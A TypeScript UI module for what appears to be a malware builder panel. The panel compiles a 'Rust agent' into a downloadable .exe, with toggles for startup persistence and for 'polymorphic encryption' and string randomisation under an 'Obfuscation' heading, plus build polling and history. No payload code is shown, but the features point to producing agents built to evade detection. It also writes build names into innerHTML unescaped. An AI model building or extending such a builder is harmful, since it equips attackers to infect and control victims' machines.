import { api } from "./api.js";

export function renderBuilder(): string {
  return `
    <h1>Builder</h1>
    <p class="hc-sub">Compile a Rust agent to .exe. Max 2 builds.</p>
    <div class="hc-builder-layout">
      <div class="hc-card">
        <h3 class="hc-section-title">Configuration</h3>
        <label>Build Name</label>
        <input id="b-name" value="veltrix-agent" placeholder="Build name" />

        <div class="hc-toggle-row">
          <span>Enable Startup</span>
          <label class="hc-toggle"><input type="checkbox" id="b-startup" /><span class="hc-toggle-slider"></span></label>
        </div>
        <div class="hc-toggle-row">
          <span>Enable Debug</span>
          <label class="hc-toggle"><input type="checkbox" id="b-debug" /><span class="hc-toggle-slider"></span></label>
        </div>

        <h3 class="hc-section-title" style="margin-top:16px">Obfuscation</h3>
        <div class="hc-toggle-row">
          <span>Polymorphic Encryption</span>
          <label class="hc-toggle"><input type="checkbox" id="b-poly" /><span class="hc-toggle-slider"></span></label>
        </div>
        <div class="hc-toggle-row">
          <span>String Randomizer</span>
          <label class="hc-toggle"><input type="checkbox" id="b-rng" /><span class="hc-toggle-slider"></span></label>
        </div>

        <button class="hc-primary hc-build-btn" id="b-build" style="margin-top:16px">Create Build</button>
        <div class="hc-build-log" id="b-log"></div>
      </div>
    </div>
    <div id="b-history"></div>`;
}

function formatSize(bytes: number): string {
  if (!bytes) return "-";
  if (bytes < 1024) return bytes + " B";
  if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + " KB";
  return (bytes / (1024 * 1024)).toFixed(2) + " MB";
}

export function bindBuilder(view: HTMLElement): void {
  const nameInput = view.querySelector<HTMLInputElement>("#b-name")!;
  const startupCb = view.querySelector<HTMLInputElement>("#b-startup")!;
  const debugCb = view.querySelector<HTMLInputElement>("#b-debug")!;
  const polyCb = view.querySelector<HTMLInputElement>("#b-poly")!;
  const rngCb = view.querySelector<HTMLInputElement>("#b-rng")!;
  const log = view.querySelector<HTMLElement>("#b-log")!;
  const buildBtn = view.querySelector<HTMLButtonElement>("#b-build")!;
  const historyEl = view.querySelector<HTMLElement>("#b-history")!;

  let pollTimer: ReturnType<typeof setInterval> | null = null;

  buildBtn.addEventListener("click", async () => {
    buildBtn.disabled = true;
    buildBtn.textContent = "Compiling...";
    log.innerHTML = '<div class="hc-build-line">Sending build request...</div>';

    try {
      await api.build({
        buildName: nameInput.value || "veltrix-agent",
        startup: startupCb.checked,
        debug: debugCb.checked,
        polyEncrypt: polyCb.checked,
        stringRandom: rngCb.checked,
      });
      log.innerHTML = '<div class="hc-build-line">Compiling... This may take a few minutes.</div>';
      startPolling();
    } catch (err) {
      log.innerHTML = `<div class="hc-build-line err">${err instanceof Error ? err.message : "Build failed"}</div>`;
      buildBtn.disabled = false;
      buildBtn.textContent = "Create Build";
    }
  });

  function startPolling() {
    if (pollTimer) clearInterval(pollTimer);
    pollTimer = setInterval(async () => {
      try {
        const builds = await api.builds();
        const compiling = builds.find((b: any) => b.status === "compiling");
        if (!compiling) {
          clearInterval(pollTimer!);
          pollTimer = null;
          const latest = builds[0];
          if (latest && latest.status === "compiled") {
            log.innerHTML = '<div class="hc-build-line ok">Compiled successfully.</div>';
          } else if (latest && latest.status === "failed") {
            log.innerHTML = '<div class="hc-build-line err">Compilation failed.</div>';
          }
          buildBtn.disabled = false;
          buildBtn.textContent = "Create Build";
          renderHistory(builds);
        }
      } catch {}
    }, 3000);
    loadHistory();
  }

  function renderHistory(builds: any[]) {
    if (!builds || builds.length === 0) { historyEl.innerHTML = ""; return; }
    historyEl.innerHTML = `
      <h2>Builds</h2>
      <div class="hc-card">
        <table class="hc-table">
          <thead><tr><th>Name</th><th>Status</th><th>Size</th><th>Date</th><th></th></tr></thead>
          <tbody>
            ${builds.map((b: any) => `<tr>
              <td class="hc-mono">${b.name}.exe</td>
              <td><span class="hc-status-badge hc-status-${b.status}">${b.status}</span></td>
              <td>${formatSize(b.size)}</td>
              <td class="hc-muted">${new Date(b.createdAt).toLocaleDateString()}</td>
              <td class="hc-build-actions">
                ${b.status === "compiled" ? `<a href="/api/build/${b.id}/download" class="hc-btn-sm">Download</a>` : ""}
                <button class="hc-btn-sm hc-btn-danger" data-delete="${b.id}">Delete</button>
              </td>
            </tr>`).join("")}
          </tbody>
        </table>
      </div>`;

    historyEl.querySelectorAll("[data-delete]").forEach(btn => {
      btn.addEventListener("click", async () => {
        const id = (btn as HTMLElement).getAttribute("data-delete")!;
        if (!confirm("Delete this build?")) return;
        (btn as HTMLButtonElement).disabled = true;
        btn.textContent = "...";
        try {
          await api.deleteBuild(parseInt(id, 10));
          loadHistory();
        } catch (err) {
          alert(err instanceof Error ? err.message : "Delete failed");
          (btn as HTMLButtonElement).disabled = false;
          btn.textContent = "Delete";
        }
      });
    });
  }

  async function loadHistory() {
    try {
      const builds = await api.builds();
      renderHistory(builds);
      if (builds.some((b: any) => b.status === "compiling") && !pollTimer) {
        startPolling();
      }
    } catch {}
  }

  loadHistory();
}
